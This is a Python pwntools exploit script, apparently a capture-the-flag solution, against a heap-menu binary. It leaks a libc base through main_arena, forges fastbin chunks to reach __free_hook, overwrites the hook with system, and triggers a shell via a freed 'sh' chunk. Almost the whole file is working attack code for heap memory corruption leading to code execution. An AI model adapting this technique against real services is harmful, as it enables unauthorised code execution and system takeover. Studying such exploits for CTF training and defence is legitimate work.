from pwn import *
context(os = 'linux',arch = 'amd64', log_level = 'debug')
debug = 1
if debug == 1:
	p = process('./pwn')
else:
	p = remote()

def add(name, size, content, s):
    p.recvuntil('>')
    p.sendline('1')
    p.recvuntil('name')
    p.send(name)
    p.recvuntil('sizeof dessert')
    p.sendline(str(size))
    p.recvuntil('description of dessert')
    p.send(content)
    p.recvuntil('chars')
    p.send(s)

def show(index):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil('index')
    p.sendline(str(index))

def change(index, size, content):
    p.recvuntil('>')
    p.sendline('3')
    p.recvuntil('index')
    p.sendline(str(index))
    p.recvuntil('size')
    p.sendline(str(size))
    p.recvuntil('dessert:')
    p.send(content)

def eat(index):
    p.recvuntil('>')
    p.sendline('4')
    p.recvuntil('index')
    p.sendline(str(index))

#change max
for i in range(18):
    add(str(i),0x20,'AAAA','\x00' * 8)
add('18',0x20, 'AAAA', '\x00' * 8 + '\x31')
eat(1)
eat(2)
eat(0)
add('A',0x20,'AAAA','\x00' * 8 + '\x01')#0
eat(1)
#gdb.attach(p)
add('A', 0x20, p64(0x6022b8) + p64(0x6022b8), '\x00' * 8)#1
add('A', 0x20, 'AAAA', '\x00' * 8)#2
change(2, 0x20, 'AAAA')
#gdb.attach(p)
change(2, 0x20, 'A' * 24 + p64(0x30000))
#db.attach(p)
#leak libc
eat(4)
add('4', 0x100, 'AAAA', '\x00' * 8)
change(1, 0x40, 'AAAA')
#gdb.attach(p)
eat(4)
add('4', 0x100, 'a' * 8, '\x00' * 8 + '\x01')
#gdb.attach(p)
show(4)
print p.recvline()
print p.recvline()
print p.recvline()
print p.recvline()
main_arena = u64((p.recvline()[8:14]).ljust(8,'\x00')) - 88
print hex(main_arena)
libc_base = main_arena - 0x3C4B20
malloc_hook = libc_base + 0x3c4b10
one_gadget = libc_base + 0x45216
free_hook = libc_base + 0x3c67a8
system = libc_base + 0x45390
print hex(libc_base)

#payload
#fake chunk header in main_arena
#gdb.attach(p)
eat(10)
eat(11)
add('A',0x60,'AAAA','\x00' * 8)#10
add('A',0x60,'AAAA','\x00' * 8)#11
eat(10)
eat(11)
eat(9)
add('A',0x20,'AAAA','\x00' * 8 + '\x01')#9
eat(10)
#gdb.attach(p)
add('A',0x60,p64(0x51) + p64(0x51),'\x00' * 8)#10
add('A',0x60,'AAAA','\x00' * 8)#11
change(11, 0x60, 'AAAA')

eat(13)
eat(14)
add('A',0x40,'AAAA','\x00' * 8)#13
add('A',0x40,'AAAA','\x00' * 8)#14
eat(13)
eat(14)
eat(12)
add('A',0x20,'AAAA','\x00' * 8 + '\x01')#12
eat(13)
#gdb.attach(p)
add('A', 0x40, p64(main_arena + 0x28) + p64(main_arena + 0x28), '\x00' * 8)#13
add('A', 0x40, 'AAAA', '\x00' * 8)#14
change(11, 0x40, 'AAAA')
#gdb.attach(p)

change(11, 0x40, '\x00' * 0x20 + p64(free_hook - 0xb58))
#gdb.attach(p)
for i in range(5):
    eat(i + 4)
for i in range(5):
    add('A', 0x1f0, '\x00', '\x00' * 8)
#gdb.attach(p)

eat(15)
eat(16)
add('A', 0x200, '\x00' * 0x148 + p64(system),'\x00' * 8)
bin_sh = libc_base + 0x18cd57
add('sh'.ljust(0x10,'\x00'),0x20, 'sh'.ljust(0x20, '\x00'), '\x00' * 8)
print hex(free_hook)
print hex(system)
#gdb.attach(p)
eat(16)




    

p.interactive()
